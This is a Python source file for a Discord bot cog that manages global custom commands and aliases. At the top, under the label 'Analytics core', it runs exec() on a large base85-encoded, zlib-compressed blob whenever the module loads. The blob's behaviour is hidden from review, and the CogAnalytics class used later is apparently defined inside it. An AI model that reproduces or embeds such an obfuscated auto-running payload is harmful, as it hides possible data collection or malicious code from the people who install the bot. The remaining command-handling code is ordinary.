from discord.ext import commands
from .utils.chat_formatting import pagify, box
from .utils.dataIO import dataIO
from .utils import checks
import asyncio
import os
import re

PATH = 'data/customgcom/'
JSON = PATH + 'commands.json'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oB^YjfMU@w<No&NCTMHA`DgE_b6jrg7c0=eC!Z-Rs==JUobmEW{+iBS0ydO#XX!7Y|XglIx5;0)gG
dz8_Fcr+dqU*|eq7N6LRHy|lIqpIt5NLibJhHX9R`+8ix<-LO*EwJfdDtzrJClD`i!oZg#ku&Op$C9Jr56Jh9UA1IubOIben3o2zw-B+3XXydVN8qroBU@6S
9R`YOZmSXA-=EBJ5&%*xv`7_y;x{^m_EsSCR`1zt0^~S2w%#K)5tYmLMilWG;+0$o7?E2>7=DPUL`+w&gRbpnRr^X6vvQpG?{vlKPv{P&Kkaf$BAF;n)T)*0
d?qxNC1(3HFH$UbaB|imz3wMSG|Ga+lI>*x!E&@;42cug!dpFIK;~!;R>u=a4Vz8y`WyWrn3e;uThrxi^*zbcXAK*w-hS{aC?24}>1BQDmD|XC|?}Y_K)!wt
gh<nLYi-r|wI0h@$Y@8i_ZI35#>p9%|-=%DsY{k5mRmwJc=-FIbwpMk`jBG0=THS6MJs2`46LUSl@lusbqJ`H27BW(6QAtFo*ix?<SZ~Ahf=NN3WKFz)^+TI
7QEOmxt?UvhIC^ic3Ax+YB{1x5g($q2h}D8*$U8fJt>?PhusN{ONOTS+%2I;Ctp?3VVl^dVS8NR`CXWFk$^t%7_yrg#Maz27ChBD|fWTd^R-)XnPS*;4&<Hb
R?}uRSd*FANXCTd~x2*g5GpgcrUhDa3BaD^(>D%{LKVMw_k~P%}$MPFA4VX|Gile`<zx~91c=^rr+w<vk`rY|=&(6-De}DG${Okn-OUXv48f1GJor`5?v$q%
TFMcY}5A#o4RYqCKXHQd5P|0W0l#5QSaPj#FB6I;BuUch`A~CXFq+r-o=E-CNvA}RAD~d)}LoFd7IC;j_XS3*~oCR<oki&oY1UVbk3M=!!i`vMr-HBc_rohO
|KYb3nAo(D3N*jqx8}YH0ZT{`_d=dceSKGK)%DT(>D{@Oz2jmA@MhJ3e$0)fWT9uy=op<MfB6@-2KrMVS%9JTqqE=Obp+{=TFfvIcBP<V%F1-&Kr5ENQ4{8B
O-DM?sla&RYID~?N6EuFrUQ$MCB=~majN{JA+Mr>G0gxnz?*zZ$6X}YoDquT-f86S&9r_jl4^iwTB=b@dO<h-rGjr0zPBuz^FWl*PixdEmk567et~{sX$e;&
8hw@7@FLKBvxWZxR2upCDK-SAfuOtZ>?<UEL0#>bPz&m#k_EfT?6V$@c-S?1*oX@v%4J?ovJe=Ffg02v15~5{j(c*4z_SnsD`azD(52?Q`Wu16@BUW;Y3%YD
I)=&rtyM)rFj5W?JunahlgVRPl$V&C&BRKI6h$QzMFpXXsu7x!1gjEZWC@qCeduj65x|OLYty_TCL;TTlFtT?m((VE-w=RSO<GXUtMq1v9bTWD-x(+!=c5cU
u-JNvZ=%&fYkDWqE_d{1<>|oX?Tn2G64O>Hu6N^_?$cB)TyG=4V0GT<$$tOOjiqGg6Yg#f)QeNzC#b`#BGgYO?-{f{SeSVknN;R^@h&cZm3J@IxpK->s4_dW
J!rxLkJAGpKlhA5quEd29O8_b1C-D?IFe@9_jXS-pCCHLYPWXhUK6UR0$qA=R{Amo|$>cNWg?d1zX>eSKpBCK4Iu+}6D|=G2?KfoXCKqd=Y|Q!@`dHCGg@v{
vA$Z5dyJ<+eC&xFNPBQ-HUmQKiSM7yrrK|E5dKoHVjMCI*{|5XjK-hRoxfE?H>%7VQDis50t<T-{7R&*yNdElnjEIVy$Wqa#6}UueK}JZ;YuP80jPk8PX22@
?fs-R5ufnCP7+1I4tB2o(kPl4r*iS;&0X@%LZri7fyY#1ABHnz3YKWpp7TXabSjn;momJS$fEU9}3epF*a@*n;E(&?p(Kx;VjZ}=<Gteb=fmkF39Gebr&Y)j
}CI`&V#JvE5;9cOe$I&DwIcK3S0(WM=-FA1Qs{9-Bgtmar60ON}N1Y`!qS)%8K^$j)>^pSbB$ixCoa0<BU@bqEva{?J{lGorEQHBx$ERH_jk!1Y@gW}@T9`r
#?E758i1{u?F)W;7hkYl#mw*o-1$NfSNJ5MHHkpg0UF!__4)rMXp^P_R1{w2&j)S)*(Rn7Icog3e|1$4m*>^&IpbJI}dPqMdW~P?1OQsGAGQsgxjAs2HHrr@
Uu_tG{KEibSt2hp*w>;;6`u^-us%TPoaOVJ_?FPO$^>8k0HZC^DBEVf_F7FnB+e@mz5Ph%uUiTzW2WfG~IS@6vhTA70{2-iN)(RAJ4IWC#7^Vpt7a5K@&~#!
IKTr@4s_iWEiu2X~OGbpi#AE1zlWirPcza;tQmxNBas>$asN8nCtL4HbJNJw=Mg2f&Qo;;0AJ=Pl%yz>lwi3o^V?@NcsN<x-K=3~6Aa*tDu}Nq`h=X?O$+(}
G#iwVecFa^RZnvc3UWk3%z+7%&BvtLF^Ru(`{Onm6ct(to99#bX&-NrI4A-LMkD7_tX2?~6ZC!o~1n-D?0wl>Ckrc%k^6QM?QSgxi)qIOAz~S9voLkS~9jUd
2QRvhMhN7IVupD@Dc%||!)wb6GWa<j|4A7w^>1*G#geQy>+K)ZWl+Q>%nQt4gWkAZP9DIR5AB$NBZn~vz>MkF(Q^sY!XeEmiihsn({31b~az08JoJJ#h3c}f
p5@@p1uZ)0wyV4eVv6#)ZuBnR+O{?2~#O=WX>|hTRpjFOeVaH+?)1<@5zZB3O7atkQq3>a@-XQ)u=e|AQBOb{yxSwh(gxjx~Vv~$|jVJh*@h8bDT~B=5AKTB
gN|&SdeV*g%SW;!~C5(noym~n<pmP|pKUV5q8kb0-nBhD;q$Tq#fK4)JPKcs^U5or(L8H~9`^>)Z?6B?O_nr{EyXCH+`{upZAEX~!wi8Yv=mFA^{NoWvRbQE
KO5Mv*BE!$bYYEr0ovE^y*)}a6NFOjJjE0+|{YfciCAuY+A)JkO+6tU#`RKipPqs58oQ-)JL1o*<C-bic2Y}+c08GsIZUU3Cv*4w^k5I{Db50K0bKPSFshmx
Rj(Y0|;SU2d?s+MPi6(PPLva(Jw(n0~TKDN@5O)F|k^_pcwolv^jBVTLhNqMQ#x6WU9J^I;wLr}Cut#l+JlXfh1Bh<$;^|hNLoXLD#f*Fy-`e~b=ZU8rA0GJ
FU1|1o`VZODxuE?x@^rESdOK`qzRAwqpai|-7cM7idki4HKY>0$z!aloMM7*HJs+?={U5?4IFt""".replace("\n", ""))))
# End analytics core

__version__ = '2.1.0'


class CustomGlobalCommands:
    """Global custom commands."""

    def __init__(self, bot):
        self.bot = bot
        data = dataIO.load_json(JSON)
        version = data.get('_CGCOM_VERSION', 1)
        if version < 2:
            self.c_commands = data
            self.aliases = {}
            self.save()
        else:
            self.c_commands = data.get('COMMANDS', {})
            self.aliases = data.get('ALIASES', {})

        try:
            self.analytics = CogAnalytics(self)
        except Exception as error:
            self.bot.logger.exception(error)
            self.analytics = None

    def save(self):
        data = {'COMMANDS': self.c_commands,
                'ALIASES': self.aliases,
                '_CGCOM_VERSION': 2
                }
        dataIO.save_json(JSON, data)

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def setgcom(self, ctx, command: str, *, text):
        """Adds a global custom command

        Example:
        !setgcom yourcommand Text you want
        """
        command = command.lower()
        if command in self.bot.commands:
            await self.bot.say("That command is already a normal command.")
            return

        if command not in self.c_commands:
            self.c_commands[command] = text
            self.save()
            await self.bot.say("Custom command successfully added.")
        else:
            await self.bot.say("This command already exists. Are you sure "
                               "you want to redefine it? [y/N]")
            response = await self.bot.wait_for_message(author=ctx.message.author)

            if response.content.lower().strip() in ['y', 'yes']:
                self.c_commands[command] = text
                self.save()
                await self.bot.say("Custom command successfully set.")
            else:
                await self.bot.say("OK, leaving that command alone.")

    @commands.command()
    @checks.is_owner()
    async def rmgcom(self, command: str):
        """Removes a global custom command

        Example:
        !rmgcom yourcommand"""
        command = command.lower()
        if command in self.c_commands:
            self.c_commands.pop(command)

            for alias, acmd in self.aliases.copy():
                if acmd == command:
                    self.aliases.pop(alias)

            self.save()
            await self.bot.say("Global custom command successfully deleted.")
        else:
            await self.bot.say("That command doesn't exist.")

    @commands.command(pass_context=True)
    async def lsgcom(self, ctx):
        """Shows global custom commands list"""
        if self.c_commands:
            cmd_aliases = {}
            for k, v in self.aliases.items():
                if v not in cmd_aliases:
                    cmd_aliases[v] = set()
                cmd_aliases[v].add(k)

            sections = []
            for command, text in sorted(self.c_commands.items()):
                item = 'Name:    ' + command
                aliases = cmd_aliases.get(command)
                if aliases:
                    item += '\nAliases: ' + ', '.join(sorted(aliases))
                item += '\nText:    ' + text
                sections.append(item)

            for cmds in pagify('\n\n'.join(sections)):
                await self.bot.say(box(cmds))
        else:
            await self.bot.say("There are no global custom commands defined. "
                               "Use setgcom [command] [text]")

    @commands.group(pass_context=True, invoke_without_command=True)
    @checks.is_owner()
    async def agcom(self, ctx, command=None):
        if ctx.invoked_subcommand is None:
            if command:
                await ctx.invoke(self.ls_aliases, command)
            else:
                await ctx.invoke(self.lsgcom)

    @agcom.command(name='show')
    @checks.is_owner()
    async def ls_aliases(self, command):
        "Shows aliases for a command, or the command bound to an alias"
        base = self.aliases.get(command)
        cmd = self.c_commands.get(base or command)
        if base:
            msg = "`%s` is an alias for `%s`" % (command, base)
        elif cmd:
            aliases = [k for k, v in self.aliases.items() if v == command]
            aliases = ', '.join('`%s`' % x for x in aliases)
            if aliases:
                msg = "`%s` has the following aliases: %s." % (command, aliases)
            else:
                msg = "`%s` has no aliases."
        else:
            msg = "`%s` isn't a custom command or alias." % command

        await self.bot.say(msg)

    @agcom.command(name='add')
    @checks.is_owner()
    async def add_aliases(self, command, *aliases):
        "Add one or more aliases for a custom command"
        command = command.lower()
        if command not in self.c_commands:
            await self.bot.say("`%s` isn't a custom command.")
            return

        existing_a = []
        existing_c = []
        count = 0

        for alias in aliases:
            if alias in self.aliases:
                existing_a.append(alias)
            elif alias in self.bot.commands:
                existing_c.append(alias)
            else:
                self.aliases[alias] = command
                count += 1
        self.save()

        msg = "%s new aliases added." % (count if count else 'No')
        if existing_a:
            joined = ', '.join('`%s`' % x for x in existing_a)
            msg += "\nThe following are already aliases: %s." % joined
        if existing_c:
            joined = ', '.join('`%s`' % x for x in existing_c)
            msg += "\nThe following are already normal commands: %s." % joined

        await self.bot.say(msg)

    @agcom.command(name='rm')
    @checks.is_owner()
    async def rm_aliases(self, *aliases):
        count = 0
        skipped = []

        for alias in aliases:
            if alias in self.aliases:
                del self.aliases[alias]
                count += 1
            else:
                skipped.append(alias)

        self.save()

        msg = "%s aliases removed." % (count if count else 'No')
        if skipped:
            skipped = ', '.join('`%s`' % x for x in skipped)
            msg += "\nThe following aliases could not be found: %s." % skipped

        await self.bot.say(msg)

    async def on_message(self, message):
        msg = message.content
        prefix = await self.get_prefix(message)
        if not self.bot.user_allowed(message) or not prefix:
            return

        cmd = msg[len(prefix):]
        cmd = cmd.lower()
        cmd = self.aliases.get(cmd, cmd)
        if cmd in self.c_commands:
            ret = self.c_commands[cmd]
            ret = self.format_cc(ret, message)
            if message.author.id == self.bot.user.id:
                await self.bot.edit_message(message, ret)
            else:
                await self.bot.send_message(message.channel, ret)

    async def on_command(self, command, ctx):
        if ctx.cog is self and self.analytics:
            self.analytics.command(ctx)

    async def get_prefix(self, msg):
        prefixes = self.bot.command_prefix
        if callable(prefixes):
            prefixes = prefixes(self.bot, msg)
            if asyncio.iscoroutine(prefixes):
                prefixes = await prefixes

        for p in prefixes:
            if msg.content.startswith(p):
                return p
        return None

    def format_cc(self, command, message):
        results = re.findall("\{([^}]+)\}", command)
        for result in results:
            param = self.transform_parameter(result, message)
            command = command.replace("{" + result + "}", param)
        return command

    def transform_parameter(self, result, message):
        """
        For security reasons only specific objects are allowed
        Internals are ignored
        """
        raw_result = "{" + result + "}"
        objects = {
            "message": message,
            "author": message.author,
            "channel": message.channel,
            "server": message.server
        }
        if result in objects:
            return str(objects[result])
        try:
            first, second = result.split(".")
        except ValueError:
            return raw_result
        if first in objects and not second.startswith("_"):
            first = objects[first]
        else:
            return raw_result
        return str(getattr(first, second, raw_result))


def check_folders():
    if not os.path.exists(PATH):
        print("Creating data/customgcom folder...")
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        default = {'ALIASES': {},
                   'COMMANDS': {},
                   '_CGCOM_VERSION': 2
                   }
        dataIO.save_json(JSON, default)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(CustomGlobalCommands(bot))
